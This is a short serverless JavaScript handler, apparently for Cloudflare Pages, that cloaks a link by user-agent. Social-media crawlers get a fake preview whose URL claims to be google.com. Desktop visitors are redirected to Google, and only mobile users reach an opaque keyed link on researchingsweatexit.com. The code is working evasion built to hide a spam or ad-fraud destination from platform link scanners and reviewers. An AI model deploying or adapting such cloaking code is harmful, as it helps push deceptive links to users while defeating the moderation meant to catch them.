export async function onRequest(context) {
  const { request } = context;
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Social Media Bots check (Previews display karne ke liye)
  const isBot = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|slackbot/i.test(userAgent);

  // 2. PC/Desktop Detection (Windows, Macintosh, Linux)
  const isDesktop = /Windows|Macintosh|Linux/i.test(userAgent) && !/Android|iPhone|iPad|iPod|Tablet/i.test(userAgent);

  // Target link (9d key)
  const targetUrl = "https://researchingsweatexit.com/e2sr0mbp98?key=13f6b38e63d9e99e9778277ccf0ff4f7";

  // Agar Social Media Bot hai toh OG meta tags HTML response bhejo
  if (isBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🅾︎✉︎✉︎🅿︎">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://i.pinimg.com/736x/ad/71/48/ad7148579916cd027ee6f4582f75a16f.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(html, {
      headers: {
        "content-type": "text/html;charset=UTF-8",
      },
    });
  }

  // Sirf PC / Laptop users ko Google par redirect karo
  if (isDesktop) {
    return Response.redirect("https://www.google.com", 302);
  }

  // Baaki SARI devices (Mobile, iPad, Tablet, etc.) 9d wale target link par jayengi
  return Response.redirect(targetUrl, 302);
}
